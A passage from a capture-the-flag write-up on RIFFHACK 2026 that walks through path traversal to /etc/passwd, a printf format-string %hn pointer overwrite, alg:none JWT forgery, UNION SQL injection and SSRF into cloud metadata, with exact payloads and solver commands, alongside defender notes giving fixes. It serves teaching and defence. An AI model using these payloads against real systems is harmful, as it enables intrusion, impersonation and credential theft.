curl -s -b "$COOKIE" \
  'http://<host>/api/reviews/proof?proof=../../../../etc/passwd' \
  | grep -oE 'bitflag\{[^}]+\}'
# bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}
```

Per-challenge README: [11-the-proof-locker](https://github.com/Abdelkad3r/RIFFHACK/tree/main/11-the-proof-locker).

The handler's bug is textbook: `path.join(proofRoot, req.query.proof)` collapses `..` segments without a subsequent `startsWith(proofRoot)` check. The mitigation is one line: normalise, then check the resolved path stays inside the root. The misdirection through banality is more interesting: the author staged the flag inside the file every solver dumps first, then made the handler refuse every "next step" so solvers who don't grep the boring file give up.

## Binary exploitation addendum

### 12. RIFFHACK Escrow Terminal

A menu-driven escrow terminal shipped as a Mach-O ARM64 binary. The vulnerability is a `printf(user_note)` in the review path with a `%n`-only blocklist that misses `%hn`. The intended chain is a positional `%p` leak of the active-vault pointer, a `%*$c` width-controlled character count, and a `%hn` write of that count into the low 16 bits of the global active-vault pointer to redirect it at the pre-prepared "dispute escrow snapshot" vault, which already has the approval latch (`0x51ff`) and the mirror checksum set.

#### Step 1 — Triage the binary

```bash
$ file artifacts/escrow_terminal
artifacts/escrow_terminal: Mach-O 64-bit executable arm64
```

Direct local execution failed on x86_64 (CPU type mismatch), so the remote service became the main oracle. Static inspection plus remote menu probing were enough to recover the control flow.

The binary has a hidden payout routine that opens `/flag.txt`. Reaching it requires the currently active vault to have two trusted fields:

- an approval latch equal to `0x51ff`
- a mirror/checksum field matching the active vault

#### Step 2 — Find the format-string bug

Menu option 3 (review the saved buyer note) calls `printf(note, ...)` directly. The program tries to filter dangerous format strings, but the blocklist only rejects a plain `%n`. Length-modified writes like `%3$hn` slip through.

The review function passes useful pointers as printf arguments. Positional specifiers reveal what those arguments are. One of them points at the global active-vault pointer; later arguments leak heap pointers around the active vault.

#### Step 3 — Prep the trusted second vault

Menu option 4 synchronises the dispute cache. The program initialises the second vault, "dispute escrow snapshot," with the required approval latch and mirror checksum. Both are correct; the only thing keeping option 5 from paying out is that the *global active-vault pointer* still points at the first, untrusted vault. Redirecting that pointer to the second vault is the entire exploit.

#### Step 4 — Leak the active-vault base

Save a buyer note that dumps positional pointer values:

```
%3$p %4$p %5$p %6$p %7$p %8$p %9$p %10$p %11$p %12$p %13$p %14$p
```

Review the note. One typical run leaks `0x557376249d87` as `active+7`; subtracting the offset recovers the active-vault base at `0x557376249d80`.

The second vault sits at `active + 0x28`, so the target write value is:

```
(active + 0x28) & 0xffff   # low 16 bits of 0x557376249da8 → 0x9da8
```

#### Step 5 — Write with `%hn`

Save a second buyer note:

```
%2$*1$c%3$hn
```

The `%2$*1$c` prints exactly the character count controlled by positional argument 1 (the display width). `%3$hn` writes that count as a 16-bit halfword into the global active-vault pointer. Chosen so the count equals the target low 16 bits.

#### Step 6 — Confirm and finalise

Menu option 1 (view pending deal) now shows the active label as "dispute escrow snapshot" instead of the original vault name. That confirms the write hit.

Menu option 5 (finalise) checks the active vault's latch and checksum. Both are `0x51ff` and matching, respectively. The payout routine opens `/flag.txt` and prints:

```
bitctf{{35cr0w_n0735_wr173_th3_ch3ck}}
```

#### Step 7 — Run the solver

```bash
python3 exploit.py 107.170.63.55 1337
```

The included solver automates the full chain: sync dispute cache, install leak format string, derive the target halfword, install the write format string, confirm the active vault change, and finalise the escrow.

Per-challenge README + full exploit: [12-riffhack-escrow-terminal](https://github.com/Abdelkad3r/RIFFHACK/tree/main/12-riffhack-escrow-terminal).

The root cause is the same as every format-string bug: the note renderer treats user-controlled text as a format string. The `%n` blocklist is a doomed strategy because positional arguments, width specifiers, and length modifiers give an attacker many equivalent ways to express reads and writes. `printf("%s", note)` is the fix; `fputs(note, stdout)` is the safer version. The secondary lesson is on the check design: relying on adjacent heap state to select the "trusted" object is fragile because a single pointer overwrite flips the trust decision.

## Cross-cutting defender notes

Six patterns recur across RIFFHACK 2026 and translate directly into production code review heuristics.

**Server component props are wire-visible secrets.** Web4 and web5 both stage the flag as a React server-component prop and let the framework leak it into the RSC HTML. In production Next.js, this is one of the most common secret-leak footguns: any value passed from a server component to a client component crosses the wire and appears in view-source before any JavaScript runs. The mechanical fix is to only render sensitive values from server components (no client-component hop), or to render them from a separate server-fetched endpoint gated by an action. The mental model to adopt: "client component props" = "public HTTP response body." If it should not be in a public response, it should not be a prop.

**`alg:none` is still shipping.** Web7 is a textbook `alg:none` JWT accept, more than two decades after the primitive was documented. Modern JWT libraries have footguns where they will accept `alg:none` unless the caller explicitly passes an `algorithms:` allow-list. Every "verify" call needs `algorithms: ['HS256']` (or `['RS256']`, or whatever your signing algorithm actually is). Every review checklist should have a line for it. Every framework's default should refuse unsigned tokens.

**Authorisation is per-resource, not per-endpoint.** Web6's `PUT /api/reviews/<id>` IDOR and web7's `GET /api/orders` IDOR are two shapes of the same bug: the handler trusts the resource identifier without checking that the caller owns the resource. The correct pattern is to fetch the resource, compare its owner to the authenticated user, and 403 on mismatch. Middleware that enforces "authed users only" is not authorisation; it's authentication. The two live at different layers.

**Query-parameter feature switches are separate endpoints.** The Night Dump's `?format=transcript` branch drops the user-scope filter that the default branch enforces. Anywhere a single endpoint changes behaviour on a query parameter is somewhere an attacker can poke. The safest posture is to treat each behaviour branch as a distinct route for authorisation purposes: the `format=transcript` branch needs its own auth check, its own column projection, its own scope filter. Sharing a handler is fine; sharing the auth reasoning is not.

**IMDSv1 is a permanent SSRF hazard.** The Trusting Verifier's mocked IMDS is a caricature of the real thing. AWS IMDSv1 has been the source of production credential leaks for a decade, and IMDSv2 exists specifically to break SSRF into it (`PUT /api/token` is required before the credential endpoints will respond). Anyone running EC2 workloads in 2026 who has not migrated to IMDSv2 is one SSRF away from role credentials. The check is one AWS CLI command; the fix is one instance-metadata setting.

**Filesystem paths need a `startsWith(root)` check after normalisation.** The Proof Locker's `path.join(proofRoot, userInput)` collapses `..` segments, which is exactly what you don't want. The canonical fix is `normalize`, then confirm the resolved path starts with the intended root plus a separator. Anything more sophisticated is a wrapper around that check. The secondary defence is to reject `..` at parse time; legitimate clients have no reason to send one.

## Frequently asked questions

### What is RIFFHACK 2026?

RIFFHACK 2026 is a CTF whose challenges are wrapped around a fictional Next.js "exploit kit marketplace" called *riffhack // exploit kit marketplace*. The core web track uses the `bitflag{...}` format across seven challenges. Four named cross-event challenges (The Night Dump, The Proof Stamp, The Trusting Verifier, The Proof Locker) reuse the same marketplace codebase from different briefs. One binary exploitation addendum (RIFFHACK Escrow Terminal) uses the `bitctf{{...}}` format from the RIFFHACK-branded binary set. Twelve challenges total; every one of them is walked step-by-step in this writeup and mirrored at [Abdelkad3r/RIFFHACK](https://github.com/Abdelkad3r/RIFFHACK).

### What are the five recurring primitives across RIFFHACK?

`alg:none` JWT accepted on every `auth-token`-reading endpoint; string-concatenated SQL on `/api/orders/lookup?ref=...` (the universal seed-dump primitive after web3); SSR-baked client props in Next.js server components (couponFlag on web4, flag on web5, plus every other "shipped as a prop" leak); SSRF on `/api/vendor/verify-website` (no allow-list, reaches mocked IMDS at 169.254.169.254 and any public HTTP host); path traversal on `/api/reviews/proof?proof=...` (concatenated into a filesystem path with no `startsWith(root)` check). Once you know all five, every brief in the event is one or two of them in a costume.

### Why does the same flag-shaped string appear across multiple RIFFHACK challenges?

Deliberate design. The marketplace codebase is salted with flag-shaped strings that are wired into seed rows, SSR props, mocked IMDS responses, and constant-stamped columns. The same string is the *real* flag for one brief and a *decoy* on another. `bitflag{3xp0rts_sh0uld_n0t_b3_0p3n_b00ks}` is the real answer for The Night Dump and a decoy on The Glitchy Contact System (reached through the same SQLi pivot). `bitflag{ssrf_1s_4_p4rty_cr4sh3r}` is real for The Trusting Verifier and a decoy on Glitchy Contact. The correct heuristic is not "grep for `bitflag\{` and submit," it is "match the brief to the surface and read the value on that surface."

### How does the Coupon Stacking prop leak beat the intended logic bug?

Next.js server components serialise their props into the RSC payload before any JavaScript runs. The dialog's `couponFlag` prop lives in the HTML at first byte. `curl http://<host>/listing/macro-builder | grep -oE 'bitflag\{[^}]+\}'` returns the flag with no login, no cookies, no UI interaction. The intended coupon-stacking bug (where the client dedup check trims and uppercases the input for validation but stores the raw string for dedup, so `WELCOME20`, `welcome20`, ` WELCOME20`, etc. all pass both gates and stack to 100%) is a distraction. The two bugs are conceptually separate: coupon-stacking is a logic error in the client; prop leak is a framework-shape mistake that would leak the secret even if the client math were perfect.

### What is the JWT `alg:none` trick used on web7?

The `auth-token` cookie is a JWT that the server verifies without asserting a specific signing algorithm. A forged token with `{"alg":"none","typ":"JWT"}` in the header, base64-encoded, followed by an arbitrary payload, followed by an empty signature, is treated as valid identity. Forging `{"id":"k7m3n","email":"k@x","isVendor":false,"iat":1,"exp":1782503527}` claims to be user `k7m3n`. The server runs the order-history query with that userId and returns their completed orders, one of which has the flag in its `notes` column. The catch is the `status = 'completed'` filter that eats the obvious userIds' orders; the seed reviewers dumped from the web3 SQLi pivot are the actually-useful targets.

### Why does The Trusting Verifier surface two different flags via the same SSRF?

The mocked IMDS exposes both `iam/security-credentials/RiffhackVendorVerifierRole` (whose JSON body has a `Token` field containing `bitflag{w3bs0ck3t_upgr4d3_ssrf_2026}`) and `latest/user-data` (whose bootstrap script exports `TRUSTING_VERIFIER_FLAG=bitflag{ssrf_1s_4_p4rty_cr4sh3r}`). Both are reachable via the same SSRF. Both are flag-shaped. Only the second is the real answer for "The Trusting Verifier" because the challenge title *is* the env var name. The first is the unflipped decoy waiting for a future brief that points at IAM credentials specifically.

### Where is the flag hidden in The Proof Locker?

Inside `/etc/passwd`, as the GECOS field of a synthetic `opsflag` user account:

```
opsflag:x:1337:1337:bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}:/nonexistent:/usr/sbin/nologin
```

The path-traversal LFI on `/api/reviews/proof?proof=../../../../etc/passwd` reads the whole file. Casual `head /etc/passwd` misses it; `grep bitflag` finds it in one shot. The misdirection is that every "next step" past `/etc/passwd` (like `/etc/shadow`, `/proc/self/environ`, `/app/.env`) is refused by the handler, so solvers who treat `/etc/passwd` as a stepping stone conclude the LFI is dead.

### What is the format-string primitive in the RIFFHACK Escrow Terminal?

Menu option 3 (review the saved buyer note) calls `printf(note, ...)` directly. The blocklist blocks a plain `%n` but misses `%hn` (16-bit write) and any other length-modified write. Positional `%p` specifiers leak useful pointers, including one that resolves to `active + 7`, the base of the currently-active vault. A second note using `%2$*1$c%3$hn` prints exactly the character count set by the display-width argument and then writes that count as a 16-bit halfword into the global active-vault pointer. The write is tuned so the count equals `(active + 0x28) & 0xffff`, redirecting the pointer at the pre-prepared "dispute escrow snapshot" vault that already has the approval latch and mirror checksum correct. Menu option 5 then finalises the payout and prints the flag.

### Why does the web3 SQL injection unlock the rest of the event?

Because it's UNION-based injection on a six-column projection with a very cheap authentication step. The `/api/orders/lookup` handler builds its SQL by string concatenation, so `' OR 1=1 --` collapses the predicate and `UNION SELECT` projects arbitrary columns from any table. Once solved, the same endpoint becomes a generic DB read: dump seed reviews (needed for web6 and web7), dump support messages including admin-only `internalNote` (Night Dump), dump `fileHash` from user-created review rows (Proof Stamp fallback). Every challenge that requires "find the seed userId" or "read this admin-only column" is one UNION away. The Night Dump and Proof Stamp solvers explicitly fall back to this pivot when their intended endpoints are unhealthy on a given deployment.

### What is the fix for the SSR prop leaks in web4 and web5?

Never pass secrets from server components to client components as props. Server components can read secrets safely (they run on the server), but the moment a value crosses into a client component, the framework serialises it into the RSC HTML. The correct patterns: render sensitive values from server components only (no client hop); render them from a separate, action-gated server endpoint that only responds after a legitimate action; keep secrets in server-only utility functions (e.g. Node process environment) and never let them flow into JSX that's owned by a client component. Removing `Error("... FLAG=" + t)` from the code doesn't help if `t` is still a client prop; the value already shipped.

### What's the broader lesson from RIFFHACK 2026?

Read the brief before you read the code. Every challenge in the event has multiple exploit primitives that surface flag-shaped values, and only one of them is the answer for the brief you're currently working. The disciplined move is to identify which surface the brief describes ("polite courtesy file" = robots.txt, "trusted redirect" = open redirect, "loose query" = SQLi predicate, "prop leak" = SSR component, "verify website" = SSRF, "proof paths" = filesystem traversal, "trusting verifier" = env var) and then walk the exploit on that specific surface. The four hours I burned on The Glitchy Contact System is the lesson generalised: when a codebase rewards depth with plausible-looking values, "I found *a* flag" is not the same as "I found *the* flag."

### Where can I find the solver scripts?

Per-challenge READMEs, artifacts, and runnable solvers are at [Abdelkad3r/RIFFHACK](https://github.com/Abdelkad3r/RIFFHACK). Every web challenge has a `solve.sh` that prints the recovered flag on the last line prefixed `[+] FLAG: bitflag{...}`. The `solve-all.sh` at the repo root runs every solver against one host. The binary exploitation addendum has a `12-riffhack-escrow-terminal/exploit.py` that automates the full leak-and-write chain.

## Closing notes

Twelve bugs, twelve primitives, one shared marketplace codebase. The event's design signature is the flag-decoy carousel: the same strings are wired into seed rows, mocked IMDS responses, and stamped columns, and every brief flips a subset of them between real and decoy. That design is both the difficulty knob and the actual pedagogy: the skill the event trains is not "find any exploit that produces a flag-shaped value" but "match the brief to the specific surface it describes, then read the value there." Grepping for `bitflag\{` is necessary but not sufficient; the four hours I spent on web5 chasing decoys is a demonstration of what happens if you skip the second half.

For more CTF writeups on this site, the [SEKAI CTF 2026 master writeup](/ctf-writeups/sekai-ctf-2026-writeup/) walks a similar mix of web, blockchain, pwn, and reverse across eleven challenges, the [V1t CTF 2026 master writeup](/ctf-writeups/v1t-ctf-2026-writeup/) covers eight cross-track challenges, and the [Anti-Slop CTF 2026 web writeup](/ctf-writeups/anti-slopctf-2026-web-writeup/) covers adjacent Next.js and shell-injection patterns. The [TraceBash CTF 2026 pwn writeup](/ctf-writeups/tracebash-ctf-2026-pwn-writeup/) walks a related format-string-to-shellcode chain. The [GPN CTF 2026 master writeup](/ctf-writeups/gpn-ctf-2026-writeup/) is another big mixed-category writeup. The full [CTF writeups index](/ctf-writeups/) is the home for everything else.

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {"@type": "Question","name": "What is RIFFHACK 2026?","acceptedAnswer": {"@type": "Answer","text": "RIFFHACK 2026 is a CTF whose challenges are wrapped around a fictional Next.js exploit-kit marketplace. The core web track uses bitflag{...} across seven challenges. Four named cross-event challenges (The Night Dump, The Proof Stamp, The Trusting Verifier, The Proof Locker) reuse the same marketplace codebase from different briefs. One binary exploitation addendum (RIFFHACK Escrow Terminal) uses bitctf{{...}}. Twelve challenges total, mirrored at github.com/Abdelkad3r/RIFFHACK."}},
    {"@type": "Question","name": "What are the five recurring primitives across RIFFHACK?","acceptedAnswer": {"@type": "Answer","text": "alg:none JWT accepted on every auth-token endpoint; string-concatenated SQL on /api/orders/lookup?ref=... (universal seed-dump after web3); SSR-baked client props in Next.js server components (couponFlag on web4, flag on web5); SSRF on /api/vendor/verify-website with no allow-list (reaches mocked IMDS at 169.254.169.254); path traversal on /api/reviews/proof?proof=... (concatenated into filesystem path with no startsWith root check)."}},
    {"@type": "Question","name": "Why does the same flag-shaped string appear across multiple RIFFHACK challenges?","acceptedAnswer": {"@type": "Answer","text": "Deliberate design. The marketplace codebase is salted with flag-shaped strings wired into seed rows, SSR props, mocked IMDS responses, and stamped columns. The same string is the real flag for one brief and a decoy on another. bitflag{3xp0rts_sh0uld_n0t_b3_0p3n_b00ks} is real for The Night Dump and a decoy on The Glitchy Contact System. bitflag{ssrf_1s_4_p4rty_cr4sh3r} is real for The Trusting Verifier and a decoy on Glitchy Contact. Match the brief to the surface, not the value to the format."}},
    {"@type": "Question","name": "How does the Coupon Stacking prop leak beat the intended logic bug?","acceptedAnswer": {"@type": "Answer","text": "Next.js server components serialise their props into the RSC payload before any JavaScript runs. The couponFlag prop is in the HTML at first byte. curl /listing/macro-builder | grep bitflag returns the flag with no login, no cookies, no UI interaction. The intended coupon-stacking logic bug (dedup check on the raw input while normalising for validation) is a distraction; the prop leak would fire even if the client math were perfect."}},
    {"@type": "Question","name": "What is the JWT alg:none trick used on web7?","acceptedAnswer": {"@type": "Answer","text": "The auth-token cookie is a JWT that the server verifies without asserting a signing algorithm. A forged token with {\"alg\":\"none\",\"typ\":\"JWT\"} and an arbitrary payload followed by an empty signature is treated as valid identity. Forging {\"id\":\"k7m3n\",\"email\":\"k@x\",\"isVendor\":false,\"iat\":1,\"exp\":1782503527} claims to be user k7m3n; the order-history query returns their completed orders, one of which contains the flag in notes."}},
    {"@type": "Question","name": "Why does The Trusting Verifier surface two different flags via the same SSRF?","acceptedAnswer": {"@type": "Answer","text": "The mocked IMDS exposes both iam/security-credentials/RiffhackVendorVerifierRole (Token field contains bitflag{w3bs0ck3t_upgr4d3_ssrf_2026}) and latest/user-data (bootstrap script exports TRUSTING_VERIFIER_FLAG=bitflag{ssrf_1s_4_p4rty_cr4sh3r}). Both reachable via the same SSRF, both flag-shaped. Only the second is the answer because the challenge title is the env var name; the first is the unflipped decoy waiting for a future brief."}},
    {"@type": "Question","name": "Where is the flag hidden in The Proof Locker?","acceptedAnswer": {"@type": "Answer","text": "Inside /etc/passwd, as the GECOS field of a synthetic opsflag user (opsflag:x:1337:1337:bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}:/nonexistent:/usr/sbin/nologin). The traversal on /api/reviews/proof?proof=../../../../etc/passwd reads the whole file. head misses it; grep bitflag finds it. The misdirection is that every next step past /etc/passwd (like /etc/shadow, /proc/self/environ, /app/.env) is refused by the handler."}},
    {"@type": "Question","name": "What is the format-string primitive in the RIFFHACK Escrow Terminal?","acceptedAnswer": {"@type": "Answer","text": "Menu option 3 calls printf(note, ...) directly. The blocklist blocks plain %n but misses %hn. Positional %p leaks pointers, including one that resolves to active+7. A second note using %2$*1$c%3$hn prints exactly the character count set by the display-width argument and writes it as a 16-bit halfword into the global active-vault pointer. Tuned so the count equals (active + 0x28) & 0xffff, redirecting the pointer at the pre-prepared 'dispute escrow snapshot' vault that already has the approval latch (0x51ff) and mirror checksum correct. Menu option 5 then finalises the payout and prints the flag."}},
    {"@type": "Question","name": "Why does the web3 SQL injection unlock the rest of the event?","acceptedAnswer": {"@type": "Answer","text": "UNION-based injection on a six-column projection with cheap authentication. /api/orders/lookup builds SQL by string concatenation; ' OR 1=1 -- collapses the predicate, UNION SELECT projects arbitrary columns from any table. After web3, the same endpoint is a generic DB read for the rest of the event: seed reviews (web6/web7), support internalNote (Night Dump), fileHash (Proof Stamp fallback). Every 'find the seed userId' or 'read this admin-only column' step is one UNION away."}},
    {"@type": "Question","name": "What is the fix for the SSR prop leaks in web4 and web5?","acceptedAnswer": {"@type": "Answer","text": "Never pass secrets from server components to client components as props. Server components can read secrets safely; the moment a value crosses into a client component, the framework serialises it into the RSC HTML. Correct patterns: render sensitive values from server components only, or from an action-gated server endpoint. Removing Error(FLAG=t) from the code doesn't help if t is still a client prop; the value already shipped."}},
    {"@type": "Question","name": "What's the broader lesson from RIFFHACK 2026?","acceptedAnswer": {"@type": "Answer","text": "Read the brief before you read the code. Every challenge has multiple exploit primitives that surface flag-shaped values, and only one is the answer for the current brief. Identify which surface the brief describes (polite courtesy file = robots.txt, trusted redirect = open redirect, loose query = SQLi predicate, prop leak = SSR component, verify website = SSRF, proof paths = filesystem traversal, trusting verifier = env var), then walk the exploit on that specific surface. Grepping for bitflag{ is necessary but not sufficient."}},
    {"@type": "Question","name": "Where can I find the solver scripts?","acceptedAnswer": {"@type": "Answer","text": "Per-challenge READMEs, artifacts, and runnable solvers are at github.com/Abdelkad3r/RIFFHACK. Every web challenge has a solve.sh that prints the recovered flag prefixed [+] FLAG: bitflag{...}. solve-all.sh runs every solver against one host. The binary exploitation addendum has 12-riffhack-escrow-terminal/exploit.py that automates the full leak-and-write chain."}}
  ]
}
</script>
